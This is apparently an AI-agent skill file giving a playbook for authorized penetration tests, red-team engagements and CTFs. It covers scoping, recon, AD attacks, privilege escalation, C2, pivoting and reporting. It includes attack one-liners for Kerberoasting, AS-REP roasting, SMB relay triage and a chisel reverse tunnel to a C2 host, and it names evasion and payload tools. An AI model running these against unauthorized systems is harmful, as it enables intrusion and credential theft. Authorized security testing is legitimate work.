---
name: offensive-security
description: Full-lifecycle offensive security skill for authorized engagements — red team operations, penetration tests, bug bounty, CTF, and lab work. Covers rules of engagement, passive and active reconnaissance, network and host enumeration, web/API/client-side exploitation, Active Directory attack paths, credential attacks, Linux and Windows privilege escalation, cloud and container attack surface, payload generation, C2, pivoting, post-exploitation, and reporting. Load when the task involves assessing, exploiting, or reporting on systems you are authorized to test.
---

# Offensive Security

Command-level playbook for the full engagement lifecycle. Reference files are loaded on demand — read the one matching the current phase or target class, not all of them.

**Full engagement?** Start from the matching playbook instead of the reference list: `playbooks/external-web.md`, `playbooks/internal-ad.md`, `playbooks/cloud-only.md`, `playbooks/retest.md`.

**Delegated job?** The subagents in `agents/` wrap these same references: `offsec-operator` (lead), `recon-operator`, `web-operator`, `ad-operator`, and `finding-reviewer` (QA gate). See §10.

## 0. Operating contract

Everything below assumes authorization. Before the first packet leaves the machine, record:

| Field | Content |
| --- | --- |
| Authorization source | Contract, bounty program scope page, CTF rules, or "own lab" |
| In scope | Exact CIDRs, domains, wildcard rules, cloud accounts, mobile/API surfaces |
| Out of scope | Third-party SaaS, shared hosting, production data, DoS, social engineering |
| RoE | Test window, rate limits, banned techniques, notification requirements |
| Data handling | Loot location, encryption, PII rules, deletion date |
| Escalation | Who to call on critical find, on outage, on scope ambiguity |

Persist as `scope.md` in the engagement directory and re-read it when a target feels borderline. A finding is worthless without a clean paper trail, and an out-of-scope packet costs the engagement.

Lab VMs, CTF infra, and systems you own need no further gatekeeping.

## 1. Lifecycle

| Phase | Goal | Output |
| --- | --- | --- |
| Scoping | Boundary, RoE, comms | `scope.md` |
| Passive recon | Asset inventory, zero target contact | `assets.txt` |
| Active recon | Live hosts, ports, services, versions | `ports.json` |
| Enumeration | Users, shares, endpoints, params, versions | `enum/` |
| Vuln analysis | Ranked candidate paths | `hypotheses.md` |
| Exploitation | Controlled proof of access | `poc/` |
| Priv escalation | Local admin / root / domain / cloud admin | `privesc.md` |
| Lateral movement | Path toward the agreed objective | `attack-path.md` |
| Objective | Crown-jewel access, impact proof | `impact.md` |
| Reporting | Reproducible findings + remediation | `report.md` |

Objectives come from scoping. "Domain admin" is a means; the objective is the business asset the client named.

## 2. Routing

| Situation | Load |
| --- | --- |
| OSINT, subdomains, ports, service banners | `references/recon.md` |
| Any HTTP/HTTPS, API, JS, auth, injection | `references/web.md` |
| Domain-joined Windows, Kerberos, LDAP, SMB | `references/ad.md` |
| Shell as a user on Linux | `references/linux-privesc.md` |
| Shell as a user on Windows | `references/windows-privesc.md` |
| AWS/Azure/GCP, Kubernetes, Docker, CI/CD | `references/cloud-container.md` |
| Payloads, shells, C2, evasion, pivoting, exfil | `references/payloads-c2-pivot.md` |
| CTF challenge, any category | `references/ctf.md` |
| Write-up, scoring, retest | `references/reporting.md` |
| Fresh Kali box, missing tools, engagement layout | `references/setup.md` |
| Android/iOS app, APK/IPA, Frida, exported components | `references/mobile.md` |
| VPN/firewall/Citrix/Fortinet/Ivanti/F5, network devices, wireless | `references/network-infra.md` |
| LLM app, chatbot, RAG, agents with tools, MCP | `references/ai-llm-security.md` |
| Phishing, pretexting, vishing, OAuth consent, physical | `references/social-engineering.md` |
| Engagement runbook, ordered day-by-day | `playbooks/*.md` |

## 3. Baseline toolchain (Kali)

| Phase | Tools |
| --- | --- |
| Recon | subfinder, amass, assetfinder, dnsx, httpx, naabu, nmap, masscan, rustscan, theHarvester, gau, waybackurls, katana, gospider |
| Web | ffuf, feroxbuster, gobuster, dirsearch, arjun, nuclei, nikto, whatweb, wafw00f, sqlmap, commix, dalfox, jwt_tool, Burp/Caido |
| AD | netexec, impacket, bloodhound + SharpHound, certipy, responder, mitm6, Coercer, Rubeus, mimikatz, PowerView, adidnsdump, enum4linux-ng |
| Privesc | linpeas, winpeas, pspy, linux-smart-enumeration, Seatbelt, SharpUp, PowerUp, PrivescCheck, GodPotato, PrintSpoofer, UACME |
| Payload/C2 | msfvenom, sliver, mythic, havoc, donut, shellter, nimcrypt2 |
| Pivot | chisel, ligolo-ng, socat, proxychains4, sshuttle, ssh, revsocks |
| Cloud | awscli, enumerate-iam, pacu, scoutsuite, prowler, az, roadtools, aadinternals, microburst, gcloud, kubectl, kube-hunter, trivy |

## 4. Phase checklists

**Passive recon**
- [ ] ASN + netblock ownership, reverse whois
- [ ] Subdomains (passive sources only), cert transparency SANs
- [ ] DNS records: A/AAAA/MX/TXT/SPF/DMARC/CNAME/NS, zone transfer attempt
- [ ] Shodan/Censys/FOFA by org, cert, favicon hash, JARM
- [ ] GitHub/GitLab dorking, CI configs, leaked keys, `.env`, sourcemaps
- [ ] Wayback/gau for historical endpoints and params
- [ ] Cloud storage discovery, bucket naming patterns
- [ ] Tech stack from job posts, docs, headers, error pages

**Active recon**
- [ ] Host discovery (ICMP, ARP on local, TCP SYN to common ports)
- [ ] Full TCP sweep, then targeted service/version scan
- [ ] Top-100 UDP
- [ ] Web probing with status/title/tech on every port
- [ ] Vhost and subdomain brute force
- [ ] TLS: SANs, expiry, weak ciphers, cert reuse across hosts

**Enumeration**
- [ ] Per-service: see `references/recon.md` port table
- [ ] Anonymous/null access: SMB, LDAP, NFS, FTP, Redis, Mongo, Elastic
- [ ] Default and weak creds on every login surface
- [ ] Web: directories, files, params, vhosts, API docs, GraphQL schema
- [ ] Version → CVE mapping, `searchsploit`, vendor advisories

**Exploitation**
- [ ] Prefer the least destructive path that proves impact
- [ ] One request at a time on production; throttle and log
- [ ] Capture full request/response pairs into `poc/`
- [ ] Stabilize any shell immediately

**Privilege escalation**
- [ ] Local: see platform reference
- [ ] Credential reuse before exploit development
- [ ] Enumerate the trust boundary you actually need to cross

**Lateral / objective**
- [ ] Document each hop with the credential or technique used
- [ ] Stop at the agreed objective; do not wander
- [ ] Prove impact with the minimum data needed (never bulk PII)

## 5. Evidence discipline

- One directory per finding: `findings/F-01/` with `request.txt`, `response.txt`, `screenshot.png`, `notes.md`.
- Timestamps in UTC. Record source IP and user agent used.
- Redact real PII in screenshots; keep hashes or counts instead.
- Every claim in the report must map to a file in `poc/`.
- Never leave test artifacts (webshells, users, cron jobs) on a client system without written approval and a removal log.

## 6. OPSEC for red team

- Separate infrastructure per engagement; no shared C2 between clients.
- Redirectors in front of C2; never expose the team server directly.
- Domain categorization and TLS cert hygiene before phishing or payload hosting.
- Sleep/jitter, staged payloads, and kill dates configured.
- Avoid noisy scanners on segmented networks; use native tooling and living-off-the-land binaries.
- Log every action taken, including failed attempts, for the deconfliction report.

## 7. Anti-patterns

- Scanning the whole /16 before checking scope.
- Running exploit modules before confirming the version and the vulnerable path.
- Chasing every finding instead of the objective.
- Blind brute force where a single password spray would do.
- Dropping a webshell as the first proof when a benign `id` suffices.
- Reporting a CVSS score without a reproducible PoC.
- Leaving a reverse shell listener running after the engagement window.

## 8. High-value one-liners

```bash
# Subdomains -> live hosts -> tech
subfinder -d target.com -silent | dnsx -silent -a -resp | httpx -silent -td -title -status-code

# Fast full-port sweep, then service scan on what's open
naabu -host 10.10.10.10 -p - -rate 2000 -silent | nmap -sV -sC -Pn -iL -

# Web content discovery
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,204,301,302,307,401,403 -ac

# Vhost discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subs.txt -fs <baseline-size>

# Nuclei with severity filter
nuclei -l live.txt -severity critical,high -rl 50 -o nuclei.txt

# AD quick triage
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
nxc smb 10.10.10.0/24 -u user -p 'pass' --shares --users --groups

# Kerberoast + AS-REP in one pass
impacket-GetUserSPNs domain/user:pass -dc-ip 10.10.10.10 -request -outputfile kerb.txt
impacket-GetNPUsers domain/ -dc-ip 10.10.10.10 -usersfile users.txt -no-pass -format hashcat

# Pivot
ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601
chisel client https://c2:443 R:socks
```

## 9. Reporting

Load `references/reporting.md`. Minimum viable finding: title, severity with CVSS vector, affected asset, preconditions, reproduction steps, evidence, business impact, remediation, references. Add an attack narrative that chains findings into the path to the objective.

Templates live in `assets/`: `scope.md.template`, `finding.md.template`, `report.md.template`, `cvss-presets.md`, `findings.example.yaml`.

```bash
python3 scripts/report.py engagements/<target>/findings.yaml --outdir report/
```

Renders `report.md`, `findings.csv`, and SARIF from one YAML source of truth. Never hand-edit the generated report — fix the YAML and re-render.

## 10. Structure

```
offensive-security/
├── SKILL.md                  entry point, routing, checklists
├── references/               domain knowledge, loaded on demand
├── playbooks/                ordered runbooks for a whole engagement
├── assets/                   scope, finding, report templates + CVSS presets
├── scripts/                  recon.sh, triage.py, report.py
└── agents/                   subagent definitions
```

| Script | Purpose |
| --- | --- |
| `scripts/recon.sh <domain> [outdir]` | subfinder → crt.sh → dnsx → httpx → naabu → gau → nuclei tech → screenshots. Missing tools are skipped, not fatal. |
| `scripts/triage.py scan.xml` | nmap XML → open-port table (markdown, `--csv`, `-o`) |
| `scripts/report.py findings.yaml` | findings YAML → `report.md` + `findings.csv` + `report.sarif` |

## 11. Subagents

| Agent | Role | Use when |
| --- | --- | --- |
| `offsec-operator` | Lead — owns state, coverage, scope gate, final report | Any engagement that needs end-to-end execution |
| `recon-operator` | Surface mapping only, no exploitation | Inventory is unknown, or a large estate needs ranking |
| `web-operator` | Web/API/client-side exploitation | HTTP is the main surface |
| `ad-operator` | Kerberos, ADCS, ACL, relay, lateral | Domain-joined Windows, internal network |
| `finding-reviewer` | Independent reproduction + severity audit | Before delivery, always |

Install for OpenCode (V2):

```bash
mkdir -p ~/.config/opencode/agents
for f in ~/Desktop/skills/offensive-security/agents/*.md; do
  ln -sf "$f" ~/.config/opencode/agents/$(basename "$f")
done
```

The lead delegates; specialists read this skill and the matching reference, then return a structured handoff. The reviewer cannot edit `findings.yaml` — that restriction is enforced by its permission block, so a FAIL cannot be papered over.
